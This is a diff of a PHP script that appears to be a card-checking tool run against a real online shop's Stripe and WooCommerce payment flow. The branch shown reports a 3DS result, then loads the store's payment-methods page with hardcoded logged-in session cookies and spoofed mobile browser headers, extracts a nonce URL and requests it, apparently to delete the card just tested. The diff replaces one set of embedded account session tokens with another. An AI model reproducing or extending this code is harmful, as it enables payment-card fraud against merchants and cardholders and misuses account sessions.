@@ -2035,8 +2035,8 @@ if ($success === true && $status === "succeeded") {
     $respo = "3DS Authenticate Attempt Successful ✅";
 
 
-
 $curl = curl_init();
+
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://healthyfungi.com.au/my-account/payment-methods/',
   CURLOPT_RETURNTRANSFER => true,
@@ -2045,14 +2045,18 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'wordpress_logged_in_febd530ada708d5093f883308bac36a7=cakof40664%7C1729527501%7CU97CdUbjWF6uipIvGujCV4wIKDrXTOl5QGXqx6FHKRc%7Cb028f17ffd031fb5d5c6067f509e6bfbf8d05da7cbfeeea3de720691d46f6683; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-18%2016%3A03%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2024-10-18%2016%3A03%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D19%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F',
+  CURLOPT_COOKIE => '__stripe_mid=553ec517-b27f-410d-844e-dac94ee43ac973a9b1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-25%2014%3A55%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-10-25%2014%3A55%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=jigotal473%7C1731078290%7CnA9vVsL3IXN2WMlAnE1skAcSbIkVlVWCthqHJDsm3Fr%7C71ed9c1387afc531579fdcc495d8d3350fe2b8166ddb49315e4bd24b73a95629; sbjs_session=pgs%3D23%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'accept-language: es-US,es;q=0.8',
     'sec-ch-ua-platform: "Android"',
-    'accept-language: es-US,es;q=0.9',
     'referer: https://healthyfungi.com.au/my-account/add-payment-method/',
   ],
 ]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+curl_close($curl);
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
@@ -2060,8 +2064,6 @@ $patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
 preg_match($patron, $response, $coincidencias);
 $url_nonce = $coincidencias[0];
 curl_close($curl);
-
-/////
 
 
 
@@ -2075,11 +2077,11 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'wordpress_logged_in_febd530ada708d5093f883308bac36a7=cakof40664%7C1729527501%7CU97CdUbjWF6uipIvGujCV4wIKDrXTOl5QGXqx6FHKRc%7Cb028f17ffd031fb5d5c6067f509e6bfbf8d05da7cbfeeea3de720691d46f6683; __stripe_mid=553ec517-b27f-410d-844e-dac94ee43ac973a9b1; __stripe_sid=8b7e9642-78a6-41c8-bd7f-aae798b3cac97331c7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-18%2016%3A03%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2024-10-18%2016%3A03%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D20%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F',
+  CURLOPT_COOKIE => '__stripe_mid=553ec517-b27f-410d-844e-dac94ee43ac973a9b1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-25%2014%3A55%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-10-25%2014%3A55%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=jigotal473%7C1731078290%7CnA9vVsL3IXN2WMlAnE1skAcSbIkVlVWCthqHJDsm3Fr%7C71ed9c1387afc531579fdcc495d8d3350fe2b8166ddb49315e4bd24b73a95629; sbjs_session=pgs%3D24%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
     'sec-ch-ua-platform: "Android"',
-    'accept-language: es-US,es;q=0.9',
+    'accept-language: es-US,es;q=0.8',
     'referer: https://healthyfungi.com.au/my-account/payment-methods/',
   ],
 ]);
@@ -2087,7 +2089,6 @@ curl_setopt_array($curl, [
 $response = curl_exec($curl);
 $err = curl_error($curl);
 curl_close($curl);
-
 
 } elseif ($success === true && $status === "requires_action") {
     $respo = "3DS Authenticate Rejected ❌";
